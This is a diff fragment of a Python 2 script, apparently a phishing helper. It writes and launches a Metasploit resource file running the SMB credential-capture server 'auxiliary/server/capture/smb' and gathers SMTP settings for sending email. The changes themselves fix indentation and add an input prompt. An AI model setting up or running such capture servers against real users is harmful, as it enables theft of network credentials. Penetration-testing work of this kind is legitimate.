@@ -16,16 +16,18 @@ def smbServ():
 	no = set(['no','n'])
 	print('ENTERED: "%s"' % choice + "\n")
 	if choice in yes:
-	with open(filename, 'w') as f1:
-		f1.write("use auxiliary/server/capture/smb"+"\n"+\
+		with open(filename, 'w') as f1:
+			f1.write("use auxiliary/server/capture/smb"+"\n"+\
 				"set srvhost"+get_ip_address()+"\n"+\
 				"exploit -j -z")
-	os.system('msfconsole -r smbServ.rc')
-	# sys.exit(2)
+			os.system('msfconsole -r smbServ.rc')
+			# sys.exit(2)
 	elif choice in no:
 		print("Ok, remember to setup your SMBCapture Server elsewhere.")
 
 	else:
+		sys.stdout.write("Please respond with 'yes' or 'no'")
+
 
 
 def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage):
@@ -70,6 +72,10 @@ def main():
 	# choice = serverOption.lower()
 	# smarthost = set(['smarthost','smart', 's', ''])
 	# localhost = set(['localhost','local', 'l'])
+
+
+
+
 	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
 	print('ENTERED: "%s"' % smtpServerAddress + "\n")
 	smtpServerPort = raw_input('Enter your SMTP Server Port[587]: ') or 587
